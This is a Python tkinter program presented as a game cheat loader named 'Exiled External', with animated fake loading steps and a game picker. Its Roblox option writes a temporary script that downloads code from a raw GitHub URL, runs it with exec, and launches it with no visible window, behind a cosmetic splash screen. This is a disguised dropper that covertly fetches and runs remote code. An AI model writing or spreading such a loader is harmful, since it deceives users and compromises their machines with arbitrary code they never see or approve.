import ctypes
import random
import math
import tkinter as tk
import subprocess
import sys
import threading
import tempfile
import os

user32 = ctypes.windll.user32
SCREEN_W = user32.GetSystemMetrics(0)
SCREEN_H = user32.GetSystemMetrics(1)

GAMES = [
    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b"},
    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444"},
    {"name": "Apex Legends",     "icon": "△", "color": "#eab308"},
    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6"},
    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e"},
    {"name": "Roblox",           "icon": "◫", "color": "#dc2626", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/rbx.py"},
]

class LoaderApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Exiled External")
        self.geometry(f"{SCREEN_W}x{SCREEN_H}")
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.attributes("-alpha", 0.0)
        self.configure(bg="#050814")
        
        self.canvas = tk.Canvas(self, bg="#050814", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        self.anim_t = 0.0
        self.particles = []
        self.game_cards = []
        
        self._init_particles()
        self._animate_background()
        
        self.lbl_title = tk.Label(self.canvas, text="E X I L E D", bg="#050814", fg="#6366f1", font=("Segoe UI", 52, "bold"))
        self.lbl_title.place(relx=0.5, rely=0.35, anchor="center")
        
        self.lbl_sub = tk.Label(self.canvas, text="E X T E R N A L", bg="#050814", fg="#94a3b8", font=("Segoe UI", 10, "bold"))
        self.lbl_sub.place(relx=0.5, rely=0.43, anchor="center")
        
        self.lbl_status = tk.Label(self.canvas, text="Initializing...", bg="#050814", fg="#64748b", font=("Segoe UI", 10))
        self.lbl_status.place(relx=0.5, rely=0.6, anchor="center")
        
        self.bar_bg = tk.Frame(self.canvas, bg="#1e2142", width=300, height=4)
        self.bar_bg.place(relx=0.5, rely=0.65, anchor="center")
        self.bar_bg.pack_propagate(False)
        self.bar_fill = tk.Frame(self.bar_bg, bg="#6366f1", width=0, height=4)
        self.bar_fill.pack(side="left", fill="y")
        
        self.fade_in()
        self.after(1000, lambda: self.load_step(0))

    def _init_particles(self):
        self.particles = []
        for _ in range(60):
            self.particles.append({"x": random.randint(0, SCREEN_W), "y": random.randint(0, SCREEN_H), "r": random.uniform(0.5, 1.5), "vx": random.uniform(-0.2, 0.2), "vy": random.uniform(-0.4, -0.1)})

    def _animate_background(self):
        self.canvas.delete("bg_anim")
        self.anim_t += 0.02
        for p in self.particles:
            p["x"] += p["vx"]
            p["y"] += p["vy"]
            if p["y"] < -10: p["y"] = SCREEN_H + 10
            if p["x"] < -10: p["x"] = SCREEN_W + 10
            if p["x"] > SCREEN_W + 10: p["x"] = -10
            r = p["r"]
            self.canvas.create_oval(p["x"]-r*3, p["y"]-r*3, p["x"]+r*3, p["y"]+r*3, fill="#1e2142", outline="", tags="bg_anim")
            self.canvas.create_oval(p["x"]-r, p["y"]-r, p["x"]+r, p["y"]+r, fill="#6366f1", outline="", tags="bg_anim")
        for i in range(3):
            offset = math.sin(self.anim_t + i) * 30
            y_base = SCREEN_H - 100 + i * 20
            pts = []
            for x in range(0, SCREEN_W + 20, 20):
                y = y_base + math.sin(x * 0.005 + self.anim_t * 2) * 15 + offset
                pts.extend([x, y])
            if len(pts) >= 4: self.canvas.create_line(pts, fill="#1e2142", width=1, tags="bg_anim")
        self.canvas.tag_lower("bg_anim")
        self.after(30, self._animate_background)

    def fade_in(self):
        a = self.attributes("-alpha")
        if a < 1.0:
            self.attributes("-alpha", min(1.0, a + 0.05))
            self.after(20, self.fade_in)

    def load_step(self, step):
        steps = [
            ("Connecting to secure server...", 15),
            ("Verifying license...", 35),
            ("Downloading modules...", 60),
            ("Injecting overlay...", 85),
            ("Ready", 100)
        ]
        if step < len(steps):
            text, pct = steps[step]
            self.lbl_status.config(text=text)
            self.bar_fill.config(width=int(300 * (pct / 100)))
            self.after(random.randint(400, 700), lambda: self.load_step(step + 1))
        else:
            self.after(500, self.show_game_picker)

    def show_game_picker(self):
        self.lbl_title.place_forget()
        self.lbl_sub.place_forget()
        self.lbl_status.place_forget()
        self.bar_bg.place_forget()
        
        self.lbl_pick = tk.Label(self.canvas, text="S E L E C T   G A M E", bg="#050814", fg="#6366f1", font=("Segoe UI", 16, "bold"))
        self.lbl_pick.place(relx=0.5, rely=0.15, anchor="center")
        
        self.game_frame = tk.Frame(self.canvas, bg="#050814")
        self.game_frame.place(relx=0.5, rely=0.55, anchor="center")
        
        self.game_cards = []
        
        for i, game in enumerate(GAMES):
            r, c = divmod(i, 3)
            wrapper = tk.Frame(self.game_frame, bg="#050814")
            wrapper.grid(row=r, column=c, padx=15, pady=15)
            card = tk.Frame(wrapper, bg="#0f1330", width=220, height=170, highlightthickness=1, highlightbackground="#1e2142", cursor="hand2")
            card.pack()
            card.pack_propagate(False)
            lbl_icon = tk.Label(card, text=game["icon"], bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
            lbl_icon.pack(pady=(30, 10))
            lbl_name = tk.Label(card, text=game["name"], bg="#0f1330", fg="#94a3b8", font=("Segoe UI", 11, "bold"))
            lbl_name.pack()
            self.game_cards.append({"frame": card, "icon": lbl_icon, "name": lbl_name, "color": game["color"], "game": game})
            
            def on_enter(e, idx=i):
                cd = self.game_cards[idx]
                cd["frame"].config(bg="#151936", highlightbackground=cd["color"])
                cd["icon"].config(bg="#151936", fg=cd["color"], font=("Segoe UI", 46))
                cd["name"].config(bg="#151936", fg=cd["color"])
                
            def on_leave(e, idx=i):
                cd = self.game_cards[idx]
                cd["frame"].config(bg="#0f1330", highlightbackground="#1e2142")
                cd["icon"].config(bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
                cd["name"].config(bg="#0f1330", fg="#94a3b8")
                
            def on_click(e, g=game):
                self.launch_game(g)
                
            for w in (card, lbl_icon, lbl_name):
                w.bind("<Enter>", on_enter)
                w.bind("<Leave>", on_leave)
                w.bind("<Button-1>", on_click)

    def launch_game(self, game_data):
        self.lbl_pick.place_forget()
        self.game_frame.place_forget()
        
        self.loading_orb = tk.Label(self.canvas, text="◈", bg="#050814", fg="#6366f1", font=("Segoe UI", 40))
        self.loading_orb.place(relx=0.5, rely=0.45, anchor="center")
        lbl = tk.Label(self.canvas, text=f"LAUNCHING {game_data['name'].upper()}", bg="#050814", fg="#e2e8f0", font=("Segoe UI", 16, "bold"))
        lbl.place(relx=0.5, rely=0.55, anchor="center")
        
        def spin():
            if not self.loading_orb.winfo_exists(): return
            chars = ["◈", "◇", "◈", "◇"]
            self.loading_orb.config(text=chars[int(self.anim_t * 5) % 4])
            self.after(100, spin)
        spin()
        
        if "run" in game_data and game_data["run"]:
            url = game_data["run"]
            
            def run_script():
                try:
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
                    tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
                    tmp.close()
                    
                    if sys.platform == "win32":
                        subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        subprocess.Popen([sys.executable, tmp.name])
                except Exception as e:
                    print(f"Failed to run script: {e}")
                    
            threading.Thread(target=run_script, daemon=True).start()
            
        self.after(1500, self.destroy)

if __name__ == "__main__":
    app = LoaderApp()
    app.mainloop()
